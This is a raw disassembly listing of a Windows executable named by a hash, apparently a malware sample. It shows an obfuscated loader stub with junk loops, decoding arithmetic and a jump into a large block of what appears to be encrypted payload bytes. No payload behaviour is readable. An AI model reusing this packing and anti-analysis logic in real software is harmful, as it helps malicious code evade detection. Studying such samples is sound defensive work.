
96950ff97ea9e8724658eb58636a6bed8b8c4fc68412a0db3379876bcccc8a62.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	int3   
  40143e:	mov    bh,BYTE PTR [ebx+0x59]
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	lock in al,0x72
  401458:	inc    edx
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   ebx,eax
  401504:	int    0xa8
  401506:	jle    0x401493
  401508:	in     al,0x16
  40150a:	and    esi,esi
  40150c:	ret    0xd5e9
  40150f:	clc    
  401510:	mov    edx,0x5c47b405
  401515:	jl     0x4014d8
  401517:	leave  
  401518:	pop    esi
  401519:	and    DWORD PTR [ecx-0x10],esi
  40151c:	mov    WORD PTR [ecx-0x7de2e85],cs
  401522:	mov    al,ds:0x20407efc
  401527:	cmc    
  401528:	cmp    al,0x81
  40152a:	mov    bl,0xaa
  40152c:	xchg   edi,eax
  40152d:	push   cs
  40152e:	in     al,0x2
  401530:	aaa    
  401531:	mov    BYTE PTR [eax+0x33],bl
  401534:	ret    
  401535:	push   0x598d4d71
  40153a:	mov    ebx,0xf4916a8
  40153f:	mov    ds:0xd5443b7e,eax
  401544:	(bad)  
  401545:	jmp    0x84da291c
  40154a:	pop    ebp
  40154b:	add    DWORD PTR [ecx+0x74],esp
  40154e:	call   0x95c2:0x6b3a00ed
  401555:	pop    ecx
  401556:	bound  ebp,QWORD PTR [ebx]
  401558:	jg     0x40159a
  40155a:	pop    es
  40155b:	mov    eax,ds:0xc1831275
  401560:	nop
  401561:	inc    ebp
  401562:	(bad)  [edx+0x5c448881]
  401568:	xchg   ebp,eax
  401569:	xor    DWORD PTR [ebx+0x6e535819],esi
  40156f:	add    al,0xa4
  401571:	mov    edi,0xb165ec07
  401576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401577:	xor    BYTE PTR [ecx-0x16aea27f],0xf7
  40157e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40157f:	(bad)  
  401580:	lods   al,BYTE PTR ds:[esi]
  401581:	scas   al,BYTE PTR es:[edi]
  401582:	push   ax
  401584:	enter  0x37b9,0xbb
  401588:	int    0x35
  40158a:	or     al,0x99
  40158c:	mov    al,ds:0x72b7675e
  401591:	xlat   BYTE PTR ds:[ebx]
  401592:	jb     0x401562
  401594:	aaa    
  401595:	jmp    0x1a4012b6
  40159a:	xor    eax,0xafd6c14f
  40159f:	or     bl,BYTE PTR [eax-0x4d]
  4015a2:	test   eax,0x7f22ceb2
  4015a7:	cmp    esi,DWORD PTR [edi-0x74]
  4015aa:	push   edx
  4015ab:	or     esp,ebx
  4015ad:	iret   
  4015ae:	call   0x2ac71d2d
  4015b3:	xor    esp,DWORD PTR [edx]
  4015b5:	cmp    ebx,edi
  4015b7:	std    
  4015b8:	cmp    BYTE PTR [esi],cl
  4015ba:	ds iret 
  4015bc:	call   0xe549f367
  4015c1:	mov    DWORD PTR [edi],0x5e7a01e6
  4015c7:	mov    ah,0x5f
  4015c9:	jns    0x401579
  4015cb:	and    eax,0x57876fdd
  4015d0:	push   eax
  4015d1:	sbb    eax,0x8345c87c
  4015d6:	cmp    cl,dh
  4015d8:	push   0xe22b6153
  4015dd:	xchg   ecx,eax
  4015de:	xor    DWORD PTR [edi+0x521ed329],ebp
  4015e4:	xchg   BYTE PTR [eax],cl
  4015e6:	fs jns 0x4015c7
  4015e9:	push   ebx
  4015ea:	or     eax,0x9313c109
  4015ef:	(bad)  
  4015f1:	jmp    0x40161d
  4015f3:	add    DWORD PTR [edi-0x6fb33d03],esp
  4015f9:	test   DWORD PTR [esi],esi
  4015fb:	xor    eax,0xb00b4cd5
  401600:	lods   al,BYTE PTR ds:[esi]
  401601:	mov    bh,0x44
  401603:	pop    esi
  401604:	pop    ds
  401605:	or     DWORD PTR [ebx],0xe86b9fbc
  40160b:	scas   al,BYTE PTR es:[edi]
  40160c:	call   DWORD PTR [edi+0x45]
  40160f:	mov    al,ds:0x927d0752
  401614:	push   ss
  401615:	pop    ss
  401616:	jecxz  0x4015e7
  401618:	dec    edx
  401619:	ins    BYTE PTR es:[edi],dx
  40161a:	mov    bl,0x92
  40161c:	das    
  40161d:	arpl   WORD PTR [esi+0x3f],bx
  401620:	mov    eax,0x14a3c9fe
  401625:	add    eax,0xef1f8c53
  40162a:	ret    0x8afd
  40162d:	push   ebx
  40162e:	sub    eax,0xdcee632e
  401633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401634:	sub    al,0x2
  401636:	dec    ebx
  401637:	push   esi
  401638:	add    edx,esp
  40163a:	pop    ebx
  40163b:	mov    edx,0x2c8d48f0
  401640:	mov    ah,0xdf
  401642:	adc    edx,DWORD PTR [edx]
  401644:	mov    WORD PTR [esi+0x66],fs
  401647:	add    DWORD PTR [ebx+0x70e7f94d],esp
  40164d:	ret    
  40164e:	aam    0x44
  401650:	push   cs
  401651:	shl    edi,0x73
  401654:	les    eax,FWORD PTR [ebx+0x4b3112a2]
  40165a:	cmp    eax,0x90cd71cd
  40165f:	and    al,0xaa
  401661:	mov    ah,0xb9
  401663:	call   0x8a7cf41
  401668:	aad    0x7
  40166a:	add    al,0x31
  40166c:	xchg   ecx,edx
  40166e:	jmp    0x4016bb
  401670:	push   0xffffff9d
  401672:	adc    edx,eax
  401674:	inc    ecx
  401675:	lds    edi,FWORD PTR [esi+0x66]
  401678:	arpl   WORD PTR [esi+0x10926cf1],dx
  40167e:	cmp    eax,esi
  401680:	push   ebx
  401681:	sbb    al,0x34
  401683:	xchg   ecx,ebp
  401685:	loop   0x4016a2
  401687:	lds    edx,FWORD PTR [ecx-0x75]
  40168a:	jbe    0x4016ea
  40168c:	aaa    
  40168d:	sbb    dh,0x89
  401690:	pop    ebp
  401691:	test   DWORD PTR [eax],edx
  401693:	fdivr  st(4),st
  401695:	loop   0x401697
  401697:	pop    esp
  401698:	jg     0x401628
  40169a:	jnp    0x4016f5
  40169c:	retf   
  40169d:	shr    DWORD PTR [edi],cl
  40169f:	mov    edi,0x65bf3cf7
  4016a4:	mov    ebx,0x52509d29
  4016a9:	ret    0x6891
  4016ac:	xor    dh,ah
  4016ae:	std    
  4016af:	cmp    al,0x1f
  4016b1:	and    DWORD PTR [ecx+0x65],edi
  4016b4:	xor    edi,ebx
  4016b6:	fdivr  QWORD PTR [edi+0x50]
  4016b9:	jo     0x401692
  4016bb:	mov    esi,0x147c448
  4016c0:	into   
  4016c1:	xchg   edi,eax
  4016c2:	xchg   esi,eax
  4016c3:	pushf  
  4016c4:	pop    ds
  4016c5:	loopne 0x40169b
  4016c7:	das    
  4016c8:	cmp    ebx,DWORD PTR gs:[ebp+0x4c]
  4016cc:	retf   0xa126
  4016cf:	cmp    DWORD PTR [edx],ecx
  4016d1:	xchg   edx,eax
  4016d2:	jle    0x4016f3
  4016d4:	fst    QWORD PTR [ecx+0x1e]
  4016d7:	sbb    DWORD PTR [esi-0x4b],edi
  4016da:	shl    BYTE PTR [edx-0x177a75ac],1
  4016e0:	push   eax
  4016e1:	lods   eax,DWORD PTR ds:[esi]
  4016e2:	xchg   edx,eax
  4016e3:	cmp    bl,ah
  4016e5:	mov    ss,edx
  4016e7:	jle    0x401717
  4016e9:	mov    edx,0x33162b3f
  4016ee:	or     al,0xc5
  4016f0:	cmp    al,0xa7
  4016f2:	ficom  WORD PTR [eax+0x71]
  4016f5:	and    BYTE PTR [ebx+0x6b],al
  4016f8:	cmp    DWORD PTR [ebx],esi
  4016fa:	push   ebp
  4016fb:	pop    es
  4016fc:	std    
  4016fd:	rcl    BYTE PTR [edx+0x25],0xd7
  401701:	in     eax,dx
  401702:	dec    esi
  401703:	repz pop DWORD PTR [ecx+ebx*4+0x2f]
  401708:	inc    esi
  401709:	inc    edi
  40170a:	sub    eax,ecx
  40170c:	push   ebx
  40170d:	fld    DWORD PTR [ebx]
  40170f:	bound  esp,QWORD PTR [ecx-0x4efe0dc]
  401715:	jno    0x40173e
  401717:	aas    
  401718:	in     al,0x57
  40171a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171b:	dec    ebx
  40171c:	mov    BYTE PTR [esi],dl
  40171e:	out    dx,al
  40171f:	jge    0x401767
  401721:	push   esp
  401722:	push   esi
  401723:	push   0x4dcc5520
  401728:	add    ch,al
  40172a:	arpl   WORD PTR [ebp+0x22],dx
  40172d:	lea    ebp,[eax]
  40172f:	ds repnz cmp al,0x87
  401733:	test   BYTE PTR [eax-0x6a],al
  401736:	or     DWORD PTR [ebp-0x58],eax
  401739:	pop    ds
  40173a:	into   
  40173b:	(bad)  
  40173c:	xor    DWORD PTR [esi+0x28],ebp
  40173f:	pop    ss
  401740:	out    0x28,al
  401742:	mov    DWORD PTR [edi-0x654a5b3c],edx
  401748:	int3   
  401749:	fmul   st,st(3)
  40174b:	or     eax,0x2277eebb
  401750:	add    DWORD PTR [eax-0x69cb54e],ebp
  401756:	icebp  
  401757:	inc    ecx
  401758:	imul   edx,DWORD PTR [eax-0x16],0xffffffd9
  40175c:	mov    edx,0x810b3735
  401761:	scas   eax,DWORD PTR es:[edi]
  401762:	push   ss
  401763:	daa    
  401764:	dec    edx
  401765:	push   ds
  401766:	ror    BYTE PTR [ebp+0xe7ef46d],cl
  40176c:	sbb    al,0x95
  40176e:	cmp    BYTE PTR [edx+0x6bc5df76],dh
  401774:	cmp    bh,bl
  401776:	cli    
  401777:	add    esp,DWORD PTR [ebx-0x18880173]
  40177d:	mov    WORD PTR [ecx-0xe],gs
  401780:	in     eax,dx
  401781:	sbb    DWORD PTR [esi],ebp
  401783:	cli    
  401784:	add    ch,BYTE PTR [ebx-0x44]
  401787:	test   al,0x5a
  401789:	add    eax,0x9ec9e427
  40178e:	pop    ebx
  40178f:	lods   al,BYTE PTR ds:[esi]
  401790:	cmp    BYTE PTR [ebx],ah
  401792:	mov    DWORD PTR [ecx+edx*8+0x32e4f5b6],ecx
  401799:	pop    esi
  40179a:	(bad)  
  40179b:	into   
  40179c:	jbe    0x4017df
  40179e:	mov    esp,0x3364aa9
  4017a3:	sysret 
  4017a5:	aad    0x55
  4017a7:	jae    0x401827
  4017a9:	inc    eax
  4017aa:	adc    al,0xa4
  4017ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ad:	or     dl,bh
  4017af:	xor    DWORD PTR [eax+0x74],esp
  4017b2:	xchg   esi,eax
  4017b3:	cdq    
  4017b4:	pop    es
  4017b5:	xchg   ebp,eax
  4017b6:	fwait
  4017b7:	push   0xffffffbc
  4017b9:	addr16 je 0x4017d5
  4017bc:	inc    esp
  4017bd:	jmp    0x2863:0x17204e95
  4017c4:	fisub  WORD PTR [esi]
  4017c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017c7:	sbb    bl,BYTE PTR [eax]
  4017c9:	mov    ah,0x7d
  4017cb:	xlat   BYTE PTR ds:[ebx]
  4017cc:	sar    DWORD PTR [edx],1
  4017ce:	jecxz  0x40179e
  4017d0:	ja     0x40181a
  4017d2:	pop    eax
  4017d3:	adc    BYTE PTR [edi-0x23],bl
  4017d6:	jp     0x401815
  4017d8:	pop    ebx
  4017d9:	pop    esi
  4017da:	jno    0x401856
  4017dc:	sub    DWORD PTR [eax+ebx*2],0x3a
  4017e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017e1:	(bad)  
  4017e2:	fild   DWORD PTR ds:0xf09a0518
  4017e8:	pop    ebx
  4017e9:	nop
  4017ea:	fucomp st(0)
  4017ec:	mov    eax,ds:0xdb6fef67
  4017f1:	imul   ebx,ebx,0x1b1d7ecd
  4017f7:	mov    ah,0xd9
  4017f9:	cld    
  4017fa:	dec    esi
  4017fb:	dec    ebp
  4017fc:	mov    esp,0xe82b487e
  401801:	mov    ebx,0x9a21bb3f
  401806:	pushf  
  401807:	pop    ds
  401808:	sti    
  401809:	lods   al,BYTE PTR ds:[esi]
  40180a:	pop    esp
  40180b:	cmp    eax,0xfcbfb49f
  401810:	(bad)  
  401811:	mov    ah,0x7f
  401813:	mov    esi,0x663e376c
  401818:	mov    edi,0x2facfa87
  40181d:	pop    ebp
  40181e:	inc    esp
  40181f:	popa   
  401820:	mov    bl,0xd8
  401822:	push   0x90ece0d6
  401827:	sti    
  401828:	maxps  xmm2,XMMWORD PTR [eax-0x7c]
  40182c:	cwde   
  40182d:	js     0x401800
  40182f:	scas   eax,DWORD PTR es:[edi]
  401830:	adc    edx,DWORD PTR ds:0x3a840b99
  401836:	into   
  401837:	jg     0x401814
  401839:	push   ds
  40183a:	pop    ds
  40183b:	jo     0x401867
  40183d:	fwait
  40183e:	push   ss
  40183f:	inc    esi
  401840:	rcl    DWORD PTR [ebx-0xb],cl
  401843:	fist   DWORD PTR ds:0xa82b189c
  401849:	sbb    ch,dh
  40184b:	dec    edx
  40184c:	dec    edi
  40184d:	gs loope 0x401888
  401850:	test   edi,ebx
  401852:	adc    al,0xe
  401854:	(bad)  
  401855:	xor    al,0x7b
  401857:	push   ds
  401858:	das    
  401859:	aad    0xc8
  40185b:	pop    edi
  40185c:	pop    ds
  40185d:	adc    ecx,DWORD PTR [eax]
  40185f:	cmp    eax,0x23a13105
  401864:	inc    ebx
  401865:	sbb    BYTE PTR [ebx],dl
  401867:	nop
  401868:	sub    DWORD PTR [eax-0x4d],esp
  40186b:	cld    
  40186c:	ss sbb esi,edi
  40186f:	sub    eax,0xd1f0b02c
  401874:	(bad)  
  401875:	adc    bl,BYTE PTR [ecx]
  401877:	stos   DWORD PTR es:[edi],eax
  401878:	(bad)  
  401879:	ficomp DWORD PTR [edx+0xb3faff2]
  40187f:	les    ecx,FWORD PTR [edi]
  401881:	(bad)  
  401883:	clc    
  401884:	mov    esp,0xd74bd020
  401889:	sbb    BYTE PTR [ebp+0x4aa970c0],cl
  40188f:	fsubr  QWORD PTR [eax]
  401891:	lahf   
  401892:	add    ecx,ebp
  401894:	mov    al,ds:0x7131b5ce
  401899:	mov    dh,0xeb
  40189b:	xor    eax,ebx
  40189d:	dec    esp
  40189e:	test   BYTE PTR [edi+0x61],ch
  4018a1:	push   ecx
  4018a2:	lds    esi,FWORD PTR [edi+0x4b]
  4018a5:	out    0x71,al
  4018a7:	push   ss
  4018a8:	daa    
  4018a9:	popf   
  4018aa:	mov    edi,0xd3692571
  4018af:	cvttps2pi mm7,xmm5
  4018b2:	in     al,0x57
  4018b4:	sar    BYTE PTR [ecx+0x27b382fc],0x30
  4018bb:	jns    0x40190e
  4018bd:	out    0xf1,eax
  4018bf:	xchg   ecx,eax
  4018c0:	mov    dh,0xe6
  4018c2:	clc    
  4018c3:	cmc    
  4018c4:	and    dl,BYTE PTR [edi+0x421ec43d]
  4018ca:	int    0xcb
  4018cc:	mov    ds:0x3b398944,eax
  4018d1:	xlat   BYTE PTR ds:[ebx]
  4018d2:	ins    BYTE PTR es:[edi],dx
  4018d3:	adc    al,0xc9
  4018d5:	frstor [edx+ebx*8-0x4d4ef879]
  4018dc:	lods   al,BYTE PTR ds:[esi]
  4018dd:	add    eax,0xb0bb2783
  4018e2:	in     al,0xd4
  4018e4:	mov    ebp,0xc57b74f8
  4018e9:	pushf  
  4018ea:	fld    st(0)
  4018ec:	or     edx,esp
  4018ee:	sub    BYTE PTR [ebx-0x55],0xbd
  4018f2:	aad    0x17
  4018f4:	xor    al,0xd8
  4018f6:	pop    ds
  4018f7:	sub    DWORD PTR [esi-0x271b5c39],ebp
  4018fd:	in     al,0x37
  4018ff:	add    al,dh
  401901:	jae    0x4018e6
  401903:	jecxz  0x401901
  401905:	call   0x6dfe:0xd520364b
  40190c:	pop    edx
  40190d:	or     dl,BYTE PTR [esi]
  40190f:	lds    ebx,FWORD PTR [esi+0x6fa40a6e]
  401915:	xchg   ebp,eax
  401916:	xchg   ecx,eax
  401917:	test   al,0x29
  401919:	test   al,0xc1
  40191b:	xchg   edx,eax
  40191c:	es jge 0x401968
  40191f:	sub    al,0xb5
  401921:	adc    DWORD PTR [ecx],esp
  401923:	(bad)  
  401924:	cs adc dh,0xc
  401928:	mov    ebp,0x6b6a2149
  40192d:	scas   eax,DWORD PTR es:[edi]
  40192e:	mov    ebx,0x53d39a73
  401933:	setp   bl
  401936:	mov    edx,0x6079b2ac
  40193b:	pop    ecx
  40193c:	pop    esi
  40193d:	xor    ch,BYTE PTR [ebp+0x51]
